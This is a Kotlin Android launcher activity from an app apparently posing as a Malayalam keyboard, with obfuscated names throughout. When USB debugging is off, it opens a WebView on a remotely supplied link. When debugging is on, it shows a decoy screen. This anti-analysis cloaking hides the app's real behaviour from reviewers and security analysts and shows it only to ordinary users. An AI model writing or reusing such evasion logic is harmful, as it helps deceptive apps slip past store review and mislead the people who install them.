package com.clusterdev.malayalamkeyboar

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.activity.viewModels
import androidx.appcompat.app.AppCompatActivity
import androidx.core.splashscreen.SplashScreen.Companion.installSplashScreen
import androidx.lifecycle.lifecycleScope
import com.clusterdev.malayalamkeyboar.datavase.badroom.WildImplHelperRoom
import com.clusterdev.malayalamkeyboar.dihilt.MainApplicationDiHilt
import com.clusterdev.malayalamkeyboar.golk.DedEst
import com.clusterdev.malayalamkeyboar.mainobjact.DedInBad
import com.clusterdev.malayalamkeyboar.uimain.WebConst
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class DedActiv : AppCompatActivity() {

    @Inject
    lateinit var vol: WildImplHelperRoom

    private val mvvm: DedMvvm by viewModels()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        installSplashScreen()
        setContentView(R.layout.activity_main)
        val hppl = application as MainApplicationDiHilt
        val ertyt = hppl.daison
        val daop = ertyt.dedInBadDao

        lifecycleScope.launch {
            if (daop.count() == 0L) {
                if (mvvm.butylDeda()){
                    val intent = Intent(this@DedActiv, WebConst::class.java)
                    intent.putExtra("deda", mvvm.getDedTeplo.toString())
                    startActivity(intent)
                    finish()
                }else{
                    mvvm.singl(this@DedActiv)
                    mvvm.getLiveDedLink().observe(this@DedActiv) {
                        if (it != null) {
                            if (Settings.Global.getString(
                                    this@DedActiv.contentResolver,
                                    Settings.Global.ADB_ENABLED
                                ) != "1"
                            ) {
                                val intent = Intent(this@DedActiv, WebConst::class.java)
                                intent.putExtra("deda", it.toString())
                                startActivity(intent)
                                finish()
                            } else {
                                startActivity(Intent(this@DedActiv, DedEst::class.java))
                            }
                        }
                    }
                }
            } else {
                if (Settings.Global.getString(
                        this@DedActiv.contentResolver,
                        Settings.Global.ADB_ENABLED
                    ) != "1"
                ) {
                    (application as MainApplicationDiHilt).redDed =
                        daop.queryBuilder().build().list().first()
                    val ded: DedInBad = (application as MainApplicationDiHilt).redDed!!
                    val intent = Intent(this@DedActiv, WebConst::class.java)
                    intent.putExtra("deda", ded.teploBad.toString())
                    startActivity(intent)
                } else {
                    startActivity(Intent(this@DedActiv, DedEst::class.java))
                }
            }
        }
    }
}